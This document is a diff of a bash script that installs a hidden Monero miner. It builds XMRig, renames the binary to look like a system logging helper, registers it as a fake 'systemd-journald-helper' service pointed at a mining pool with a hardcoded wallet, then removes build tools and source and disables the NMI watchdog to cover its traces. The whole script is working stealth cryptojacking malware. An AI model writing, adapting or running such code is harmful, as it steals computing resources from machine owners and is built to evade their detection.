@@ -1,49 +1,69 @@
 #!/bin/bash
 
-# Set folder name (disguised)
-HIDDEN_DIR="/opt/.syslib"
-GIT_REPO="https://github.com/justinproject1115/TEST.git"
-SERVICE_NAME="syslogd"
+# ===== CONFIGURATION =====
+WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"  # REPLACE THIS WITH YOUR WALLET
+POOL="pool.supportxmr.com:443"       # Recommended pool (TLS for stealth)
+MAX_CPU="50"                         # Limit CPU usage (%)
+WORKER=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)  # Random worker name
+# ========================
 
-echo "🔧 Setting up hidden miner..."
+echo "🔧 Setting up Monero stealth miner..."
 
-# Remove any old folder
-sudo rm -rf "$HIDDEN_DIR"
+# --- 1. Install Dependencies ---
+sudo apt update >/dev/null 2>&1 && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev >/dev/null 2>&1
 
-# Clone repo to hidden path
-sudo git clone "$GIT_REPO" "$HIDDEN_DIR"
+# --- 2. Clone & Build XMRig ---
+git clone https://github.com/xmrig/xmrig.git --quiet
+cd xmrig || exit
+mkdir build && cd build
+cmake .. -DWITH_HWLOC=OFF >/dev/null 2>&1  # Disable hardware locator
+make -j$(nproc) --quiet
 
-# Rename the script to look harmless
-cd "$HIDDEN_DIR" || exit 1
-sudo mv miner.sh sysd
-sudo chmod +x sysd
+# --- 3. Disguise Miner Binary ---
+sudo mv ./xmrig /usr/local/bin/syslogd-helper  # Common system name
+sudo chmod +x /usr/local/bin/syslogd-helper
 
-# Move binary to /usr/local/bin
-sudo cp sysd /usr/local/bin/sysd
+# --- 4. Create Fake Systemd Service ---
+echo "📦 Creating disguised systemd service..."
 
-# Create fake systemd service
-sudo tee /etc/systemd/system/${SERVICE_NAME}.service > /dev/null <<EOF
+sudo tee /etc/systemd/system/systemd-journald-helper.service >/dev/null <<EOF
 [Unit]
-Description=System Logging Daemon (syslogd)
+Description=Systemd Journald Helper
 After=network.target
 
 [Service]
-ExecStart=/usr/local/bin/sysd
+ExecStart=/usr/local/bin/syslogd-helper \\
+  -o $POOL \\
+  -u $WALLET.$WORKER \\
+  --tls \\
+  --cpu-max-threads-hint=$MAX_CPU \\
+  --randomx-mode=fast \\
+  --background \\
+  --quiet
 Restart=always
-RestartSec=5
-Nice=10
-CPUWeight=10
-IOWeight=10
+RestartSec=30s
+Nice=19
+CPUWeight=5
+IOWeight=5
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# Enable and start
-sudo systemctl daemon-reload
-sudo systemctl enable ${SERVICE_NAME}
-sudo systemctl start ${SERVICE_NAME}
+# --- 5. Enable Service ---
+sudo systemctl daemon-reload >/dev/null 2>&1
+sudo systemctl enable systemd-journald-helper --now >/dev/null 2>&1
 
-echo "✅ Miner is running as background service: ${SERVICE_NAME}"
-echo "🔍 View logs: sudo journalctl -u ${SERVICE_NAME} -f"
-echo "🛑 Stop miner: sudo systemctl stop ${SERVICE_NAME}"
+# --- 6. Cleanup Traces ---
+sudo apt remove -y cmake make gcc >/dev/null 2>&1
+rm -rf ~/xmrig 2>/dev/null
+sudo sysctl -w kernel.nmi_watchdog=0 >/dev/null 2>&1
+
+# --- 7. Output ---
+echo "✅ Miner is running stealthily as 'systemd-journald-helper'"
+echo "🔍 Wallet: $WALLET"
+echo "👷 Worker: $WORKER"
+echo "⚡ CPU Limit: ${MAX_CPU}%"
+echo "📌 Commands:"
+echo "   Check status: sudo systemctl status systemd-journald-helper"
+echo "   Stop mining:  sudo systemctl stop systemd-journald-helper"
